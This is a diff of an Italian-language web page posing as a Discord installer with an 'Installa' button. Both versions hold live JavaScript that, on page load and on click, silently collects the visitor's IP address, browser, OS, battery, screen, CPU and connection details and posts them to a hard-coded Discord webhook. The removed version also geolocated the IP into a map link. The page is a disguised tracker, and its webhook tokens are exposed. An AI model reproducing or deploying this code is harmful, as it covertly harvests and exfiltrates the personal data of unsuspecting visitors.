@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="it">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,110 +7,106 @@
     <style>
         body {
             font-family: Arial, sans-serif;
-            margin: 20px;
-            padding: 20px;
-            background-color: #f4f4f4;
             text-align: center;
+            margin: 50px;
+        }
+        h1 {
+            margin-bottom: 20px;
         }
         button {
-            background-color: #007bff; /* Blu */
-            color: white; /* Testo bianco */
-            padding: 10px 20px; /* Spaziatura interna */
-            border: none; /* Nessun bordo */
-            border-radius: 5px; /* Bordi arrotondati */
-            font-size: 16px; /* Dimensione del testo */
-            cursor: pointer; /* Puntatore a mano */
-            transition: background-color 0.3s; /* Transizione del colore */
-        }
-        button:hover {
-            background-color: #0056b3; /* Blu più scuro al passaggio del mouse */
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+            background-color: #7289DA;
+            color: white;
+            border: none;
+            border-radius: 5px;
         }
     </style>
 </head>
 <body>
-    <h1>Installazione di Discord</h1>
-    <button onclick="window.location.href='https://discord.com/api/downloads/distributions/app/installers/latest?channel=stable&platform=win&arch=x64';">
-        Installa
-    </button>
+
+    <h1>Installazione Discord</h1>
+    <button onclick="installDiscord()">Installa</button>
 
     <script>
-        async function sendDeviceInfo() {
-            const deviceInfo = {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screenResolution: `${window.screen.width}x${window.screen.height}`,
-                online: navigator.onLine,
-                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                hardwareConcurrency: navigator.hardwareConcurrency,
-                memory: navigator.deviceMemory || 'N/A',
-                ipAddress: null,
-                locationLink: 'N/A'
-            };
+        async function getDeviceInfo() {
+            // Sistema operativo
+            const os = navigator.platform;
 
-            // Ottieni l'indirizzo IP
-            await fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    deviceInfo.ipAddress = data.ip;
+            // Browser e versione
+            const userAgent = navigator.userAgent;
 
-                    // Ottieni la posizione geografica
-                    return fetch(`https://ipinfo.io/${data.ip}/json?token=YOUR_IPINFO_TOKEN`);
-                })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.loc) {
-                        const [lat, lon] = data.loc.split(',');
-                        deviceInfo.locationLink = `https://www.google.com/maps?q=${lat},${lon}`;
-                    }
-                });
+            // Lingua preferita
+            const language = navigator.language;
 
-            // Crea il payload per Discord
+            // Stato della batteria
+            let batteryLevel = "Non disponibile";
+            let chargingStatus = "Non disponibile";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryLevel = `${Math.floor(battery.level * 100)}%`;
+                chargingStatus = battery.charging ? "Carica" : "Non in carica";
+            }
+
+            // Indirizzo IP
+            let ipAddress = "Non disponibile";
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                ipAddress = data.ip;
+            } catch (error) {
+                console.error('Errore nel recuperare l\'IP:', error);
+            }
+
+            // Schermo
+            const screenWidth = window.screen.width;
+            const screenHeight = window.screen.height;
+
+            // Numero di core del processore
+            const hardwareConcurrency = navigator.hardwareConcurrency;
+
+            // Connessione di rete
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            const connectionType = connection ? connection.effectiveType : "Non disponibile";
+
+            // Invio al webhook di Discord
+            const webhookUrl = "https://discord.com/api/webhooks/1272560385056309308/HDi64rOGFyq5ZxVyV0NUaLr75YEqwl3SkeXBzeRvfGE_4apZZH2_jBZSwpdBXIQ_LuFq";
             const payload = {
+                content: "Informazioni sul dispositivo:",
                 embeds: [{
-                    title: "Informazioni del Dispositivo",
-                    color: 0x0099ff, // Blu chiaro
+                    title: "Dettagli Dispositivo",
                     fields: [
-                        { name: 'User Agent', value: deviceInfo.userAgent || 'N/A', inline: true },
-                        { name: 'Piattaforma', value: deviceInfo.platform || 'N/A', inline: true },
-                        { name: 'Lingua', value: deviceInfo.language || 'N/A', inline: true },
-                        { name: 'Risoluzione dello Schermo', value: deviceInfo.screenResolution || 'N/A', inline: true },
-                        { name: 'Stato Connessione', value: deviceInfo.online ? 'Online' : 'Offline', inline: true },
-                        { name: 'Fuso Orario', value: deviceInfo.timeZone || 'N/A', inline: true },
-                        { name: 'Memoria', value: deviceInfo.memory || 'N/A', inline: true },
-                        { name: 'IP Indirizzo', value: deviceInfo.ipAddress || 'N/A', inline: true },
-                        { name: 'Posizione', value: deviceInfo.locationLink || 'N/A', inline: true }
-                    ],
-                    footer: {
-                        text: "Messaggio inviato tramite webhook",
-                        icon_url: "https://i.imgur.com/AfFp7pu.png" // Icona del footer
-                    }
+                        { name: "Sistema Operativo", value: os, inline: true },
+                        { name: "Browser", value: userAgent, inline: true },
+                        { name: "Lingua", value: language, inline: true },
+                        { name: "Livello Batteria", value: batteryLevel, inline: true },
+                        { name: "Stato Batteria", value: chargingStatus, inline: true },
+                        { name: "Indirizzo IP", value: ipAddress, inline: true },
+                        { name: "Risoluzione Schermo", value: `${screenWidth}x${screenHeight}`, inline: true },
+                        { name: "Core del Processore", value: hardwareConcurrency.toString(), inline: true },
+                        { name: "Tipo di Connessione", value: connectionType, inline: true },
+                    ]
                 }]
             };
 
-            // Invia il payload al webhook Discord
-            const webhookUrl = 'https://discord.com/api/webhooks/1272243742962614374/6qq-6f1Y7sXupLfshryiw4nkNMOQFHGOzWd0l0iG0p-1SzJxHd0nScxzWHTMiZ2SJ9eM';
-            try {
-                const response = await fetch(webhookUrl, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
-                    body: JSON.stringify(payload)
-                });
-
-                if (response.ok) {
-                    console.log('Informazioni del dispositivo inviate con successo.');
-                } else {
-                    console.error('Errore nell\'invio delle informazioni:', response.status, response.statusText);
-                }
-            } catch (error) {
-                console.error('Errore:', error);
-            }
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
         }
 
-        // Invia le informazioni al caricamento della pagina
-        window.onload = sendDeviceInfo;
+        function installDiscord() {
+            getDeviceInfo(); // Invia informazioni sul dispositivo
+            window.open("https://discord.com/download", "_blank"); // Reindirizza al download di Discord
+        }
+
+        // Esegue automaticamente la raccolta delle informazioni sul dispositivo
+        getDeviceInfo();
     </script>
+
 </body>
 </html>
